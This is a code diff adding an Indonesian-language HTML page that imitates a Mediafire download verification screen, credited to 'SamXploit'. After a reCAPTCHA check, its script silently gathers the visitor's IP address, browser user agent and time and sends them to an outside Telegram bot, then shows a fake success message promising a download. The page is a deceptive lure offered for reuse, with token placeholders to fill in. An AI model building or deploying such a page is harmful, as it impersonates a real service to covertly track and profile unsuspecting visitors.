@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verifikasi Mediafire</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom right, #0066cc, #003366);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .box {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      border-radius: 12px;
+      padding: 30px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
+      width: 90%;
+      max-width: 400px;
+    }
+
+    .box h2 {
+      margin-bottom: 15px;
+    }
+
+    .box p {
+      margin-bottom: 25px;
+    }
+
+    .footer {
+      position: absolute;
+      bottom: 10px;
+      text-align: center;
+      font-size: 13px;
+      color: white;
+      opacity: 0.7;
+      width: 100%;
+    }
+  </style>
+  <!-- reCAPTCHA API -->
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</head>
+<body>
+
+  <div class="box">
+    <h2>🔐 Verifikasi Diperlukan</h2>
+    <p>Silakan verifikasi untuk melanjutkan ke halaman download.</p>
+    <div class="g-recaptcha" data-sitekey="6LdeHZArAAAAAFZT1atO2lPapq8V_sSs0nKE1Uba" data-callback="onVerified"></div>
+  </div>
+
+  <div class="footer">
+    © 2025 SamXploit | Mirip Tampilan Mediafire + reCAPTCHA
+  </div>
+
+  <script>
+    async function onVerified() {
+      const ip = await fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => data.ip);
+
+      const userAgent = navigator.userAgent;
+      const waktu = new Date().toLocaleString("id-ID");
+
+      const pesan = `✅ *Verifikasi Berhasil*\n\n📌 IP: ${ip}\n📱 Perangkat: ${userAgent}\n🕒 Waktu: ${waktu}`;
+
+      const BOT_TOKEN = 'ISI_BOT_TOKEN_KAMU';
+      const CHAT_ID = 'ISI_CHAT_ID_KAMU';
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: pesan,
+          parse_mode: 'Markdown'
+        })
+      });
+
+      alert('✅ Verifikasi berhasil! Anda akan diarahkan ke halaman download.');
+      // window.location.href = 'https://link-download-kamu.com'; // opsional redirect
+    }
+  </script>
+
+</body>
+</html>
